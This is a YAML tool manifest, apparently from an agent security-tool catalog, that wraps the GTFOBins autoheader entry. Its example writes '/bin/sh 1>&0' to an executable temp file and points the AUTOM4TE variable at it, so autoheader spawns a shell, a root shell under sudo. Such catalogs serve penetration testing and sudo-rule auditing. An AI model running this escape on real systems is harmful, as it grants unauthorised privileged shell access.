---
id: build-autotools-autoheader
namespace: build:autotools:autoheader
name: autoheader
description: Generate config.h.in templates, can be used to spawn a shell via the AUTOM4TE environment variable.
author: "GTFOBins"
version: "1.0.0"
capabilities:
  - security.privilege-escalation.shell
platforms:
  - linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - autoconf
  - autoreconf
artifacts: []
workflow_edges:
  produces:
    - shell-access
  consumes:
    - execution-context
contract:
  inputs:
    - type: security.execution.context
      description: Sudo or unprivileged execution context
  outputs:
    - type: process.output
      description: Shell output
  side_effects:
    - process_spawn
    - filesystem_write
  resource_cost:
    cpu: low
    memory_mb: 8
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 8
  network: none
  disk_io: low
allowed-tools:
  - autoheader
  - Bash
  - execFile
parameters: []
features:
  - process-manip
execution:
  template: "autoheader"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
  - description: Spawn a shell via autoheader using AUTOM4TE
    command: |
      echo '/bin/sh 1>&0' >/path/to/temp-file
      chmod +x /path/to/temp-file
      touch configure.ac
      AUTOM4TE=/path/to/temp-file autoheader
references:
  - label: "GTFOBins"
    url: "https://gtfobins.github.io/gtfobins/autoheader/"
techniques:
  - privilege-escalation
  - execution
install:
  - method: apt
    package_name: "autoconf"
    commands:
      - "apt-get install -y autoconf"
---
